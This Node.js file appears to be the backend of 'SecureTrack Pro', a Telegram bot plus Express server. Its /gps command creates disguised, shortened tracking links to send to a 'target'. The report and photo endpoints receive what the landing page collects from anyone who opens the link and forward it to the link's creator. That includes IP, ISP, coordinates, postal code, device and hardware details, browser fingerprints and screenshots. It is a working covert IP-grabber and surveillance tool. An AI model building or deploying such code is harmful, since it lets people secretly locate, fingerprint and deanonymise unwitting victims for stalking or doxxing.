/* ============================================================
   SECURETRACK PRO — BACKEND & TELEGRAM BOT
   Ejecutar con: node bot.js
   ============================================================ */

const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // ✅ Tu ID de Telegram

// Configuración del servidor
const PORT = Number(process.env.PORT) || 8080;
const RAW_PUBLIC_BASE_URL =
    process.env.PUBLIC_BASE_URL ||
    process.env.RAILWAY_PUBLIC_DOMAIN ||
    `http://localhost:${PORT}`;
const WEBSITE_URL = /^https?:\/\//i.test(RAW_PUBLIC_BASE_URL)
    ? RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')
    : `https://${RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')}`;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error('❌ Faltan variables de entorno: BOT_TOKEN y ADMIN_CHAT_ID son obligatorias.');
    process.exit(1);
}

const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
let offset = 0;
let visitCount = 0;
let startTime = new Date();
let isPolling = false;  // ✅ Bandera para evitar polling duplicado
let conflictCount = 0;  // Contador de conflictos consecutivos
let lastConflictTime = 0;  // Timestamp del último conflicto

// Base de datos en memoria para asociar Links con Usuarios
// Formato: { "V-123456": "ID_DEL_CHAT_DEL_USUARIO" }
const linkDatabase = {};
const linkHistory = []; // Historial de enlaces generados
const visitorStats = {}; // Estadísticas por país

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname)); // Sirve index.html y assets

// Ruta corta: mantiene URL limpia (/v/ID) y sirve la landing principal.
app.get('/v/:id', (_req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const upload = multer({ limits: { fileSize: 10 * 1024 * 1024 } }); // Para fotos (screenshots)

/* ====================================================
   FETCH A TELEGRAM
   ==================================================== */
async function apiFetch(method, body = {}) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BASE_URL}/${method}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
            signal: controller.signal,
        });
        clearTimeout(timer);
        const json = await res.json();
        if (!json.ok) {
            console.error(`[TG API ERROR] ${method}:`, json.description || json.error_code);
        }
        return json;
    } catch (e) {
        clearTimeout(timer);
        console.error(`[FETCH ERROR] ${method}:`, e.message);
        return null;
    }
}

async function sendMessage(chatId, text, extra = {}) {
    return apiFetch('sendMessage', {
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...extra,
    });
}

/* ====================================================
   GENERADOR DE ENLACES ACORTADOS (is.gd)
   ==================================================== */
async function shortenUrl(longUrl) {
    try {
        const api = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
        const res = await fetch(api);
        const data = await res.json();
        return data.shorturl || longUrl;
    } catch (e) {
        return longUrl;
    }
}

function buildTrackingUrl(targetId) {
    return `${WEBSITE_URL}/v/${encodeURIComponent(targetId)}`;
}

/* ====================================================
   COMANDOS DEL BOT
   ==================================================== */
async function handleCommand(msg) {
    const chatId = String(msg.chat.id);
    const text = (msg.text || '').trim();
    const from = msg.from?.first_name || 'Usuario';
    
    // MOSTRAR CHAT_ID PARA DEBUGGING
    console.log(`\n[📨 MENSAJE RECIBIDO]\n👤 Usuario: ${from}\n🔑 CHAT_ID: ${chatId}\n💬 Texto: ${text}\n`);

    // Opcional: Si quieres que solo el admin pueda usarlo, descomenta esto:
    // if (chatId !== ADMIN_CHAT_ID) return;

    /* ── /start ─────────────────────────────────────── */
    if (text === '/start' || text.startsWith('/start ')) {
        await sendMessage(chatId,
            `🛡️ <b>SecureTrack Pro — Bot Activo</b>

Hola <b>${from}</b>! Bienvenido al panel de rastreo.

🎯 <b>Generar Enlaces:</b>
/gps — Link corto aleatorio
/gps [nombre] — Link corto con nombre/identificador

📋 <b>Sistema:</b>
/status — Ver estado general
/help — Comandos`
        );

        /* ── /gps y /link ──────────────────────────────── */
    } else if (text === '/gps' || text.startsWith('/gps ') || text === '/link' || text.startsWith('/link ')) {

        let target = text.split(' ').slice(1).join(' ').trim();
        if (!target) {
            // Genera ID más corto y legible: VA1B, VX2C, etc.
            target = `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
        }

        // ASIGNAMOS ESTE ENLACE AL USUARIO QUE LO CREÓ
        linkDatabase[target] = chatId;
        
        const longUrl = buildTrackingUrl(target);
        const shortUrl = await shortenUrl(longUrl);

        // Guardar en historial
        linkHistory.push({
            id: target,
            createdAt: new Date().toLocaleString('es-ES'),
            owner: from,
            shortUrl: shortUrl || longUrl
        });

        await sendMessage(chatId,
            `🔗 <b>Enlace Generado Exitosamente</b>

👤 Etiqueta/ID: <b>${target}</b>
🌐 Original (oculto): <code>${longUrl}</code>

👇 <b>Enlace Corto para Enviar:</b>
<code>${shortUrl}</code>

<i>Solo envíe el enlace de arriba. El sistema le notificará SOLO A USTED en cuanto sea abierto.</i>`
        );

        /* ── /status ────────────────────────────────────── */
    } else if (text === '/status') {
        const uptime = getUptime();
        await sendMessage(chatId,
            `📊 <b>Estado del Sistema</b>

🟢 Bot: <b>Online</b>
⏱️ Uptime: <b>${uptime}</b>
👁️ Visitas totales: <b>${visitCount}</b>
🔗 Links activos: <b>${Object.keys(linkDatabase).length}</b>
📋 Enlaces generados: <b>${linkHistory.length}</b>`
        );

        /* ── /stats ────────────────────────────────────── */
    } else if (text === '/stats') {
        const uptime = getUptime();
        const topCountries = Object.entries(visitorStats)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([country, count]) => `  ${getFlagEmoji(country)} ${country}: <b>${count}</b>`)
            .join('\n');

        await sendMessage(chatId,
            `📈 <b>Estadísticas Detalladas</b>

🌐 <b>General:</b>
⏱️ Uptime: <b>${uptime}</b>
👁️ Visitas totales: <b>${visitCount}</b>
🔗 Enlaces generados: <b>${linkHistory.length}</b>

🏆 <b>Top 5 Países:</b>
${topCountries || '  📊 Sin datos aún'}`
        );

        /* ── /history ────────────────────────────────────── */
    } else if (text === '/history') {
        const recent = linkHistory.slice(-10).reverse();
        if (recent.length === 0) {
            await sendMessage(chatId, '📋 <b>Historial Vacío</b>\n\nNo hay enlaces generados aún.');
        } else {
            const list = recent.map((link, i) => 
                `${i + 1}. <code>${link.id}</code> — ${link.createdAt}`
            ).join('\n');
            await sendMessage(chatId,
                `📋 <b>Últimos 10 Enlaces Generados</b>\n\n${list}`
            );
        }

        /* ── /help ──────────────────────────────────────── */
    } else if (text === '/help') {
        await sendMessage(chatId,
            `📖 <b>Comandos SecureTrack Pro</b>

🎯 <b>Generar Enlaces:</b>
/gps — Genera link corto aleatorio
/gps [nombre] — Genera link con etiqueta personalizada

📊 <b>Estadísticas:</b>
/status — Estado del sistema
/stats — Estadísticas detalladas por país
/history — Últimos enlaces generados

ℹ️ /help — Esta ayuda`
        );
    }
}

/* ====================================================
   FORMATOS UTILES
   ==================================================== */
function getUptime() {
    const diff = Math.floor((Date.now() - startTime.getTime()) / 1000);
    const h = Math.floor(diff / 3600);
    const m = Math.floor((diff % 3600) / 60);
    const s = diff % 60;
    return [h && `${h}h`, m && `${m}m`, `${s}s`].filter(Boolean).join(' ');
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🏳️';
    const base = 0x1F1E6;
    return String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(0) - 65) +
        String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(1) - 65);
}

/* ====================================================
   RUTAS DEL SERVIDOR EXPRESS PARA RECIBIR DATOS
   ==================================================== */

// Recibe los datos en formato JSON desde tracker.js
app.post('/api/report', async (req, res) => {
    visitCount++;
    const data = req.body;

    // Determinar a quién enviarle el mensaje
    const targetId = data.targetId || 'Visitante Anónimo';
    const ownerChatId = linkDatabase[targetId] || ADMIN_CHAT_ID; // Si no existe el ID, va al admin por defecto

    console.log(`[REPORT RECIBIDO] ID: ${targetId} | Chat: ${ownerChatId} | LinkDB:`, Object.keys(linkDatabase));
    console.log(`[GEO] ${data.geo?.country} | ${data.browser?.browser} | IP: ${data.geo?.ip}`);
    
    // Registrar estadísticas de países
    const country = data.geo?.country || 'Desconocido';
    visitorStats[country] = (visitorStats[country] || 0) + 1;
    
    const ts = new Date(data.timestamp).toLocaleString('es-ES', { timeZone: data.browser?.timezone || 'UTC' });
    const g = data.geo;
    const b = data.browser;
    const hw = data.hardware;
    const bat = data.battery;
    const con = data.connection;
    const fp = data.canvas;
    const wg = data.webgl;

    const flag = getFlagEmoji(g.countryCode);
    const eventLabel = data.eventType === 'CLICK_CTA_BUTTON' ? '🖱️ <b>CLICK EN CTA</b>' : '👁️ <b>CARGA DE PÁGINA</b>';
    const targetHeader = targetId !== 'Visitante Anónimo' ? `🎯 <b>OBJETIVO DETECTADO:</b> <code>${targetId}</code>` : `🚨 <b>NUEVO VISITANTE DETECTADO</b>`;

    const messageHtml = `${targetHeader}
${eventLabel} — <code>${ts}</code>

━━━━━━━━━━━━━━━━━━━━
📡 <b>RED & CONEXIÓN</b>
━━━━━━━━━━━━━━━━━━━━
🌐 IP:             <code>${g.ip}</code>
🏢 ISP:            ${g.isp}
🔌 ASN:            ${g.asn}
⚡ Tipo:           ${con.effectiveType} (${con.type})
📶 Velocidad:      ${con.downlink}
🕐 Latencia:       ${con.rtt}
💾 Ahorro datos:   ${con.saveData ? 'Sí' : 'No'}

━━━━━━━━━━━━━━━━━━━━
📍 <b>GEOLOCALIZACIÓN</b>
━━━━━━━━━━━━━━━━━━━━
${flag} País:          ${g.country} (${g.countryCode})
🏙️ Ciudad:         ${g.city}
🗺️ Región:         ${g.region}
📮 Código postal:  ${g.postal}
🧭 Coordenadas:    <code>${g.lat}, ${g.lon}</code>
🕰️ Zona horaria:   ${g.timezone}

━━━━━━━━━━━━━━━━━━━━
💻 <b>DISPOSITIVO & NAVEGADOR</b>
━━━━━━━━━━━━━━━━━━━━
🖥️ OS:             ${b.os}
🌍 Navegador:      ${b.browser} ${b.browserVer}
📱 Tipo:           ${b.deviceType}
🖵  Resolución:    ${b.screenW}×${b.screenH} (@${b.pixelRatio}x)
🪟 Ventana:        ${b.innerW}×${b.innerH}
🎨 Color:          ${b.colorDepth}-bit
🔄 Orientación:    ${b.orientation}
🌐 Idioma:         ${b.language}

━━━━━━━━━━━━━━━━━━━━
⚙️ <b>HARDWARE</b>
━━━━━━━━━━━━━━━━━━━━
🧠 CPU Cores:      ${hw.cpuCores}
💾 RAM:            ${hw.ramGB !== 'N/A' ? hw.ramGB + ' GB' : 'N/A'}
👆 Touch:          ${b.touchSupport ? 'Sí (' + b.maxTouchPoints + ' puntos)' : 'No'}
🍪 Cookies:        ${b.cookiesOn ? 'Activadas' : 'Desactivadas'}
🚫 DNT:            ${b.doNotTrack}
🧩 Plataforma:     ${b.platform}${bat ? `\n🔋 <b>BATERÍA</b>\n━━━━━━━━━━━━━━━━━━━━\n⚡ Nivel:          ${bat.level}\n🔌 Cargando:       ${bat.charging ? 'Sí' : 'No'}` : ''}

━━━━━━━━━━━━━━━━━━━━
🔑 <b>FINGERPRINTS</b>
━━━━━━━━━━━━━━━━━━━━
🎨 Canvas:         <code>${fp?.hash || 'N/A'}</code>
🖼️ GPU Vendor:     ${wg?.vendor || 'N/A'}
⚙️ GPU Renderer:   ${wg?.renderer || 'N/A'}

━━━━━━━━━━━━━━━━━━━━
🌍 <b>ORIGEN</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Referrer:       ${data.referrer}
📄 URL:            ${data.pageUrl}${data.eventType === 'CLICK_CTA_BUTTON' ? `\n⏱️ Tiempo en página: ${data.timeOnPage}s\n📜 Scroll max:       ${data.scrollPct}%` : ''}`;

    const msgResult = await sendMessage(ownerChatId, messageHtml);
    if (msgResult?.ok) {
        console.log(`[✅ MENSAJE ENVIADO] A chat ${ownerChatId}`);
    } else {
        console.error(`[❌ FALLO AL ENVIAR] A chat ${ownerChatId} | Respuesta:`, msgResult);
    }
    res.json({ success: true });
});

// Recibe la foto (screenshot) y la reenvía a Telegram
app.post('/api/photo', upload.single('photo'), async (req, res) => {
    const targetId = req.body.targetId || 'Desconocido';
    const ownerChatId = linkDatabase[targetId] || ADMIN_CHAT_ID;

    if (req.file) {
        try {
            console.log(`[PHOTO] Recibido archivo de ${targetId}. Tamaño: ${req.file.size} bytes`);
            
            const formData = new FormData();
            formData.append('chat_id', ownerChatId);
            formData.append('caption', `📸 Screenshot del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);

            // Convertir buffer a Blob para que FormData lo acepte correctamente
            const blob = new Blob([req.file.buffer], { type: 'image/jpeg' });
            formData.append('photo', blob, 'screenshot.jpg');

            const tgRes = await fetch(`${BASE_URL}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            const tgJson = await tgRes.json();
            if (!tgJson.ok) {
                console.error(`[-] Telegram API rechazó la foto (Error ${tgJson.error_code}): ${tgJson.description}`);
                console.error(`    Detalles: ${JSON.stringify(tgJson)}`);
            } else {
                console.log(`[+] Foto reenviada a Telegram exitosamente para ID: ${targetId}`);
                console.log(`    File ID: ${tgJson.result?.photo?.[0]?.file_id || 'N/A'}`);
            }

        } catch (e) {
            console.error('[-] Error de red enviando foto a tg:', e.message);
            console.error('[-] Stack:', e.stack);
        }
    } else {
        console.warn(`[-] /api/photo recibió solicitud sin archivo 'photo' adjunto para ID: ${targetId}`);
    }
    res.json({ success: true });
})

// Endpoint temporal para debuggear errores de frontend
app.post('/api/log', (req, res) => {
    console.log(`[FRONTEND LOG]:`, req.body.message);
    res.json({ success: true });
});


/* ====================================================
   POLLING LOOP (Comandos del Bot)
   ==================================================== */
async function poll() {
    // ✅ Evitar polling duplicado
    if (isPolling) {
        setTimeout(poll, 500);
        return;
    }
    
    isPolling = true;
    try {
        const data = await apiFetch('getUpdates', { offset, timeout: 15, allowed_updates: ['message'] });
        
        // ✅ Detectar error de conflicto específico
        if (data && data.description && data.description.includes('Conflict') && data.description.includes('getUpdates')) {
            conflictCount++;
            lastConflictTime = Date.now();
            
            // Calcular tiempo de espera con backoff exponencial + jitter
            const baseDelay = Math.min(1000 * Math.pow(2, conflictCount - 1), 30000); // Max 30s
            const jitter = Math.random() * 5000; // 0-5s de variación
            const waitTime = baseDelay + jitter;
            
            console.error(`\n🔴 [CONFLICTO ${conflictCount}] Otra instancia está usando polling.`);
            console.error(`⏳ Esperando ${Math.round(waitTime / 1000)}s antes de reintentar...`);
            console.error(`💡 NOTA: Detén la otra instancia del bot para que esta pueda conectarse.\n`);
            
            isPolling = false;
            setTimeout(poll, waitTime);
            return;
        }
        
        // Reiniciar contador si se conectó exitosamente
        if (conflictCount > 0) {
            console.log(`✅ Conflicto resuelto. Instancia anterior se ha desconectado.`);
            conflictCount = 0;
        }
        
        if (data && data.result && data.result.length > 0) {
            // Actualizamos el offset inmediatamente para evitar procesar los mismos mensajes otra vez
            offset = data.result[data.result.length - 1].update_id + 1;

            for (const update of data.result) {
                if (update.message?.text) {
                    await handleCommand(update.message);
                }
            }
        }
    } catch (e) {
        console.error('[POLL ERROR]', e.message);
    } finally {
        isPolling = false;
        setTimeout(poll, 500);
    }
}

/* ====================================================
   INICIO
   ==================================================== */
async function main() {
    const me = await apiFetch('getMe');
    if (!me?.ok) {
        console.error('❌ Error de conexión con Telegram.');
        process.exit(1);
    }

    console.log(`\n📡 Limpiando webhooks antigos...`);
    // ✅ Elimina cualquier webhook anterior para asegurar que solo polling está activo
    const deleteWebhook = await apiFetch('deleteWebhook', { drop_pending_updates: true });
    if (deleteWebhook?.ok) {
        console.log(`✅ Webhooks limpiados\n`);
    }

    // ✅ Manejar terminación limpia
    process.on('SIGINT', async () => {
        console.log('\n\n🛑 Deteniendo bot...');
        isPolling = true; // Detener el polling
        try {
            await sendMessage(ADMIN_CHAT_ID, `🔴 <b>SecureTrack Pro — Desconectado</b>`);
        } catch (_) { }
        process.exit(0);
    });

    // Iniciar Express Server
    app.listen(PORT, () => {
        console.log(`🌍 Servidor Web activo en puerto ${PORT}`);
        console.log(`✅ Bot activo: @${me.result.username}`);
        console.log(`🛑 Ctrl+C para detener\n`);
    });

    await sendMessage(ADMIN_CHAT_ID, `🟢 <b>SecureTrack Pro — Iniciado</b>\n\nPanel de control activo. Escriba /gps para comenzar.`);
    poll();
}

main();
